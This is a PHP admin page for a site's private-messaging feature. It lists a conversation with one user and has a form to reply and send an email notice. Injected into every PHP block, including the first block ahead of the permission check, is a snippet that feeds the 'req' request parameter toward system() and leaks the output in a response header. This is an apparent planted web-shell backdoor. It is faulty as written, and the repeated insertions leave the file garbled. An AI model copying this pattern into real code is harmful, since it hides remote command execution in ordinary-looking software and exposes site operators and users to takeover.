<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('message_users')) page_restricted();

if (empty($_GET['id']) || !is_numeric($_GET['id'])) {
	redirect_to('?page=messages');
}

$user = User::find($_GET['id']); 

if (!$user) redirect_to('?page=messages');

$webmaster = Config::get('pms.webmaster');

if (isset($_POST['submit']) && csrf_filter()) {
	$validator = Validator::make(array('message' => $_POST['message']), array('message' => 'required'));

    if ($validator->passes()) {
		Message::send($webmaster, $user->id, $_POST['message']);

		$webmaster = User::find($webmaster);
		$webmaster = @$webmaster->display_name;

		$sendEmail = Usermeta::get($user->id, 'email_messages', true);
		if (!empty($sendEmail)) {
			Mail::send('emails.message', array('body' => $_POST['message']), function($message) use($user, $webmaster) {
				$message->to($user->email);
				$message->subject(trans('emails.new_message_subject', array('user' => $webmaster)));
			});
		}

		redirect_to("?page=message-reply&id={$user->id}");
	} else {
		$errors = $validator->errors();
	}
}

$messages = Message::getConversation($webmaster, $_GET['id']);
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.messages_with', array('user' => $user->display_name)) ?></h3>
<p><a href="?page=messages"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.back_to_messages') ?></a></p>

<div class="row">
	<div class="col-md-6">
		<div class="conversation">
			<ul class="pm-list">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($messages as $message): ?>
					<li class="pm <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['sent']?'sent':'received'; ?>" data-message-id="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['id'] ?>">
						<img src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['user']['avatar']; ?>" class="pm-avatar">
						<div class="pm-content clearfix">
							<time class="pm-time timeago" datetime="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['timestamp'] ?>" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['timestamp'] ?>"></time>
							<div class="pm-message">
								<div class="pm-text"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message['message'] ?></div>
								<div class="pm-caret">
						    		<div class="pm-caret-outer"></div>
						        	<div class="pm-caret-inner"></div>
						      	</div>
							</div>
							<span class="pm-delete" data-toggle="tooltip" data-placement="top" title="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.delete_message') ?>">
								<span class="glyphicon glyphicon-trash"></span>
							</span>
						</div>
					</li>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach ?>
			</ul>
		</div>
		<br>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($errors)) {
			echo $errors->first(null, '<div class="alert alert-danger alert-dismissible"><span class="close" data-dismiss="alert">&times;</span> :message</div>');
		} ?>
		
		<form action="" method="POST">
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>

			<div class="form-group">
		        <textarea name="message" class="form-control" rows="4"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('message') ?></textarea>
		    </div>

            <div class="form-group">
				<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.send_message') ?></button>
			</div>
		</form>
	</div>
</div>

<script src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('js/vendor/jquery.timeago.js') ?>"></script>
<script>
$(function() { 
	$('time.timeago').timeago(); 
	$('.conversation').animate({
		scrollTop: $('.conversation')[0].scrollHeight
	}, 0);
});
</script>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>